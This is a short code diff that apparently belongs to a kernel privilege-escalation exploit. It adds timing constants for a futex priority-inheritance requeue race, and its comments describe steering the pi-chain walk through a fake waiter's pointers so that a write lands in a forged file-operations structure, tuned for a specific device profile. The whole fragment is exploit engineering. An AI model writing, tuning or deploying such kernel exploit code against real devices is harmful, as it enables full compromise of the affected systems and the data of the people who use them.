@@ -22,6 +22,18 @@
  * Setting it to 0x4c0 desyncs objs_per_slab (25 -> 26) and the
  * KernelSnitch scan stride. Verified empirically v33 vs v35. */
 #define SKB_DATA_DELTA (-0xe80LL)
+
+/* PI-requeue race timing — copied from the device-tested dm3q
+ * profile.  Without these the CMP_REQUEUE_PI fires before the
+ * waiter is fully blocked in futex_wait_requeue_pi and the
+ * pi-chain walk never reaches the fake waiter's rb_left/rb_right
+ * pointers, so the write-through into fake_fops never happens. */
+#ifndef SLIDE_REQUEUE_ARM_USEC
+#define SLIDE_REQUEUE_ARM_USEC 20000
+#endif
+#ifndef SLIDE_WAIT_NSEC
+#define SLIDE_WAIT_NSEC 2000000000L
+#endif
 #define SLIDE_FAKE_WAITER_PRIO 0
 #define SLIDE_WAITER_WAKE_STATE 0
 #define SLIDE_LOCK_OWNER_VALUE 1ULL
